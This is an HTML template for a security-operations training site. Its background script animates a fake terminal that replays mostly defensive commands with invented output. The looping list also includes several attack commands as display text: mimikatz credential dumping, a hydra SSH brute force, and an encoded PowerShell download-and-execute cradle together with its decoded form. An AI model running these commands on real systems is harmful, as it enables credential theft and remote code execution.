<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOC Lab - {% block title %}Dashboard{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
</head>
<body style="background:#0a0e14;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;">

<canvas id="fluidCanvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;background:radial-gradient(ellipse at 50% 0%,#0d1b2a 0%,#0a0e14 70%);"></canvas>

<button id="sidebarToggle" onclick="toggleSidebar()" style="position:fixed;top:16px;left:16px;z-index:1001;background:rgba(17,24,39,0.7);border:1px solid #374151;color:#9ca3af;width:40px;height:40px;border-radius:10px;cursor:pointer;transition:.2s;">
    <i class="bi bi-three-dots-vertical"></i>
</button>

<div id="sidebar" style="position:fixed;top:0;left:-280px;width:260px;height:100%;z-index:1002;background:rgba(13,17,23,0.98);border-right:1px solid #1f2937;padding:20px;overflow-y:auto;transition:.3s;">
    <div class="d-flex justify-content-between align-items-center mb-3">
        <h6 class="mb-0 text-primary"><i class="bi bi-shield-shaded me-2"></i>SOC Lab</h6>
        <button class="btn btn-sm text-secondary" onclick="toggleSidebar()"><i class="bi bi-x-lg"></i></button>
    </div>
    <hr class="text-secondary">
    <a href="/" class="d-block py-2 px-2 rounded text-decoration-none text-light" style="transition:.2s;" onmouseover="this.style.background='#1f2937'" onmouseout="this.style.background='transparent'"><i class="bi bi-house-door me-2"></i>Dashboard</a>
    <div class="mt-3 mb-1 px-2"><small class="text-secondary">CURRICULUM (25 TOPICS)</small></div>
    {% for t in CURRICULUM %}
    <a href="/topic/{{ t.id }}" class="d-block py-2 px-2 mb-1 rounded text-decoration-none small {% if topic is defined and topic.id == t.id %}text-primary fw-bold{% else %}text-light{% endif %}" style="transition:.2s;" onmouseover="this.style.background='#1f2937'" onmouseout="this.style.background='transparent'">
        <i class="{{ t.icon }} me-2 text-{{ t.color }}" style="font-size:0.75rem;"></i>{{ t.title }}
    </a>
    {% endfor %}
</div>

<div id="sidebarOverlay" onclick="toggleSidebar()" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;background:rgba(0,0,0,0.5);"></div>

<a href="https://github.com/socbymoz" target="_blank" class="text-decoration-none" style="position:fixed;bottom:16px;right:16px;z-index:1000;background:rgba(17,24,39,0.7);border:1px solid #374151;color:#9ca3af;padding:8px 14px;border-radius:20px;font-size:0.8rem;transition:.2s;" onmouseover="this.style.borderColor='#0d6efd';this.style.color='#0d6efd'" onmouseout="this.style.borderColor='#374151';this.style.color='#9ca3af'">
    <i class="bi bi-github me-1"></i>Built by socbymoz
</a>

<div class="main-content" style="position:relative;z-index:1;padding:20px;max-width:900px;margin:0 auto;">
    {% block content %}{% endblock %}
</div>

<style>
canvas { display: block; }
</style>
<script>
function toggleSidebar() {
    const s = document.getElementById('sidebar');
    const o = document.getElementById('sidebarOverlay');
    if (s.style.left === '0px') {
        s.style.left = '-280px';
        o.style.display = 'none';
    } else {
        s.style.left = '0px';
        o.style.display = 'block';
    }
}

// Code terminal running in background with typing effect
(function() {
    const canvas = document.getElementById('fluidCanvas');
    const ctx = canvas.getContext('2d');
    let W, H;
    const LINE_H = 22;
    const FONT_SIZE = 13;
    let startY = 0;
    const scrollSpeed = 0.3;
    
    const commands = [
        { cmd: 'soc@lab:~$ tail -f /var/log/auth.log', out: 'Jun 17 08:12:34 sshd[2345]: Failed password for root from 45.33.32.156 port 51234 ssh2' },
        { cmd: 'soc@lab:~$ grep "Accepted" /var/log/auth.log | wc -l', out: '12 successful logins (expected: ~3)' },
        { cmd: 'soc@lab:~$ sudo tcpdump -i eth0 port 9050', out: '10:15:22.334 IP 10.10.10.50.49157 > 185.220.101.1.9050: Flags [S], seq 12345' },
        { cmd: 'soc@lab:~$ curl -s http://10.0.0.5:9200/_cat/indices', out: 'yellow open syslog-2026.06.17 5 1 12458 0 45mb 45mb' },
        { cmd: 'soc@lab:~$ nmap -sV 192.168.1.0/24', out: '22/tcp open ssh OpenSSH 7.4\n80/tcp open http Apache 2.4.6\n3389/tcp open ms-wbt-server Microsoft RDP' },
        { cmd: 'soc@lab:~$ powershell Get-EventLog -LogName Security -InstanceId 4625 | select -first 5', out: 'Index Time EntryType Source InstanceID\n----- ---- --------- ------ ----------\n12458 Jun 17 Failure Audit Microsoft-Windows-Security-Auditing 4625' },
        { cmd: 'soc@lab:~$ wazuh-agent -c "syscheck_scan"', out: '[SCAN] Starting integrity scan...\n[SCAN] /etc/passwd: modified (expected)\n[SCAN] /var/www/html/shell.php: NEW (critical)' },
        { cmd: 'soc@lab:~$ zeek -r capture.pcap traffic-log', out: '12543 HTTP requests\n342 HTTPS connections\n12 DNS queries to known malicious domains\n3 Tor connections detected' },
        { cmd: 'soc@lab:~$ vol.py -f mem.dump windows.pslist', out: 'PID PPID Name\n 1234 5678 powershell.exe (suspicious parent: WINWORD.EXE)\n 5678 1234 cmd.exe' },
        { cmd: 'soc@lab:~$ yara -s -r malware_rules.yar /tmp/suspicious.exe', out: 'cobalt_strike_beacon /tmp/suspicious.exe\n0x4e20: $a1: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00' },
        { cmd: 'soc@lab:~$ sha256sum suspicious.exe', out: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b' },
        { cmd: 'soc@lab:~$ curl -X GET "https://virustotal.com/api/v3/files/a1b2c3d4e5f6a7b8c9d0" -H "x-apikey: ***"', out: '{"data":{"attributes":{"last_analysis_stats":{"malicious":45,"harmless":5,"undetected":10}}}}' },
        { cmd: 'soc@lab:~$ sudo iptables -A INPUT -s 45.33.32.156 -j DROP', out: '[ RULE ADDED ] 45.33.32.156 blocked at firewall' },
        { cmd: 'soc@lab:~$ grep -r "password1" /var/www/html/wp-config.php', out: '/var/www/html/wp-config.php:define(\'DB_PASSWORD\', \'password1\');' },
        { cmd: 'soc@lab:~$ python3 -c "import hashlib; print(hashlib.md5(b\'infected.exe\').hexdigest())"', out: 'd41d8cd98f00b204e9800998ecf8427e' },
        { cmd: 'soc@lab:~$ ss -tulpn | grep ESTABLISHED | grep -v 443', out: 'tcp ESTAB 0 0 10.10.10.50:49157 185.220.101.1:9050 users:("wscript.exe",pid=2345)' },
        { cmd: 'soc@lab:~$ schtasks /query /tn "GoogleUpdateTask" /v', out: 'Task: GoogleUpdateTask\nStatus: Running\nTask To Run: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AcABhAHkAbABvAGEAZAAnACkA' },
        { cmd: 'soc@lab:~$ mimikatz "privilege::debug" "sekurlsa::logonpasswords"', out: 'Username: backup_admin\nDomain: CORP\nPassword: P@ssw0rd! (found in LSASS)' },
        { cmd: 'soc@lab:~$ dmesg | tail -20', out: '[12345.678] usb 1-1: new high-speed USB device number 42\n[12345.679] New USB device found: SanDisk Cruzer Blade (suspicious)' },
        { cmd: 'soc@lab:~$ cat /var/log/syslog | grep -c "fail\|error\|invalid"', out: 'Count: 127 (baseline: ~15/day) — anomaly detected' },
        { cmd: 'soc@lab:~$ hydra -l admin -P rockyou.txt ssh://192.168.1.100 -t 4', out: '[22][ssh] host: 192.168.1.100 login: admin password: password1' },
        { cmd: 'soc@lab:~$ sqlmap -u "http://testphp.vulnweb.com/products.php?id=1" --batch', out: 'Parameter: id (GET)\nType: boolean-based blind\nPayload: id=1\' AND 1=1--' },
        { cmd: 'soc@lab:~$ base64 -d <<< "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA="', out: 'IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.2/malware.exe\')' },
        { cmd: 'soc@lab:~$ systemctl status wazuh-agent', out: 'wazuh-agent.service - Wazuh agent\nActive: active (running)\nAlerts sent today: 1,245' },
        { cmd: 'soc@lab:~$ ssdeep -b -l /var/www/html/uploads/', out: 'ssdeep,1.1--blocksize:hash:hash,filename\n98304:rK4sN8jX0pQ2mW5vL9fR6tZ1yA3c:rK4sN8jX0pQ /uploads/shell.php' },
        { cmd: 'soc@lab:~$ diff -r /etc/ /backup/etc/', out: 'Only in /etc/: shadow.new\nOnly in /backup/etc/: cron.deny' },
    ];
    
    let lines = [];
    let currentCmd = 0;
    let charIdx = 0;
    let phase = 'typing'; // typing -> output -> wait -> next
    let outputLine = '';
    let outputCharIdx = 0;
    let waitTimer = 0;
    let scrollOffset = 0;
    
    function resize() {
        W = canvas.width = window.innerWidth;
        H = canvas.height = window.innerHeight;
    }
    
    function typeChar() {
        const cmd = commands[currentCmd];
        if (charIdx < cmd.cmd.length) {
            charIdx++;
            const promptLine = cmd.cmd.substring(0, charIdx);
            if (lines.length === 0 || lines[lines.length-1] !== promptLine) {
                if (lines.length > 0 && lines[lines.length-1].startsWith('soc@lab')) {
                    lines[lines.length-1] = promptLine;
                } else {
                    lines.push(promptLine);
                }
            }
            if (lines.length > 150) lines.shift();
        } else {
            phase = 'output';
            outputCharIdx = 0;
            outputLine = '';
        }
    }
    
    function typeOutput() {
        const out = commands[currentCmd].out;
        if (outputCharIdx < out.length) {
            outputCharIdx++;
            outputLine = out.substring(0, outputCharIdx);
            const idx = lines.length - 1;
            if (lines[idx] && !lines[idx].startsWith('soc@lab')) {
                lines[lines.length-1] = outputLine;
            } else {
                lines.push(outputLine);
            }
            if (lines.length > 150) lines.shift();
        } else {
            phase = 'wait';
            waitTimer = 0;
        }
    }
    
    let lastTypeTime = 0;
    const typeSpeed = 35;
    const outputSpeed = 15;
    const WAIT_DURATION = 2500;
    
    function update() {
        const now = Date.now();
        if (phase === 'typing' && now - lastTypeTime > typeSpeed) {
            lastTypeTime = now;
            typeChar();
        } else if (phase === 'output' && now - lastTypeTime > outputSpeed) {
            lastTypeTime = now;
            typeOutput();
        } else if (phase === 'wait') {
            waitTimer += 16;
            if (waitTimer > WAIT_DURATION) {
                currentCmd = (currentCmd + 1) % commands.length;
                charIdx = 0;
                phase = 'typing';
                // scroll a bit to show new content
            }
        }
        scrollOffset += scrollSpeed;
        if (scrollOffset > LINE_H) scrollOffset -= LINE_H;
    }
    
    function render() {
        ctx.clearRect(0, 0, W, H);
        ctx.font = `${FONT_SIZE}px 'Courier New', monospace`;
        
        const visibleLines = Math.floor(H / LINE_H) + 2;
        const startLine = Math.max(0, lines.length - visibleLines);
        
        for (let i = 0; i < visibleLines; i++) {
            const li = startLine + i;
            if (li >= lines.length) break;
            const line = lines[li];
            if (!line) continue;
            
            const y = (i + 1) * LINE_H - scrollOffset;
            if (y < -LINE_H || y > H + LINE_H) continue;
            
            const isCmd = line.startsWith('soc@lab');
            const isOutput = !isCmd && line.length > 0;
            
            // Dim effect based on position
            const distFromCenter = Math.abs(y - H/2) / (H/2);
            const alpha = Math.max(0.08, 0.25 * (1 - distFromCenter * 0.7));
            
            if (isCmd) {
                // Command line: green prompt + dim command
                ctx.fillStyle = `rgba(0, 200, 83, ${alpha})`; // green prompt
                ctx.fillText('soc@lab:~$ ', 30, y);
                ctx.fillStyle = `rgba(200, 200, 200, ${alpha * 1.2})`;
                const cmdText = line.substring(12);
                ctx.fillText(cmdText, 30 + ctx.measureText('soc@lab:~$ ').width, y);
            } else if (isOutput) {
                ctx.fillStyle = `rgba(100, 180, 255, ${alpha * 0.9})`; // blue output
                ctx.fillText(line, 30, y);
            }
        }
    }
    
    function loop() {
        update();
        render();
        requestAnimationFrame(loop);
    }
    
    resize();
    loop();
})();
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
{% block extra_scripts %}{% endblock %}
</body>
</html>
